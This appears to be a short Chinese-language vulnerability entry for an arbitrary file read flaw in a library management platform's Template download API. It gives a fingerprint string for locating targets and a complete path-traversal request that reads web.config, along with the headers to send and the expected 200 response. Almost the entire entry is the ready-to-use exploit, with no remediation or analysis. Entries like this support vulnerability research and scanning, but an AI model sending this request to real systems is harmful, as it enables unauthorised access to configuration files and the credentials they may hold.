# 图书馆管理平台Template存在任意文件读取漏洞

- **系统**：图书馆管理平台　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`"static_home/dll.vendor.js"`
- **请求**：`GET /Api/Lib/Download/Template?fileName=Template/../../../web.config HTTP/2`
- **关键头**：`Cookie: Hm_lvt_2de16be8e38d12d149757d4984d8dc9a=1734416053; HMACCOUNT=F3A0D49D22D0A4BB; …`　`Sec-Fetch-User: ?1`　`If-None-Match: "ab432327b7e4da1:0"`　`If-Modified-Since: Fri, 02 Aug 2024 08:37:04 GMT`　`Priority: u=0, i`
- **预期**：200　|　—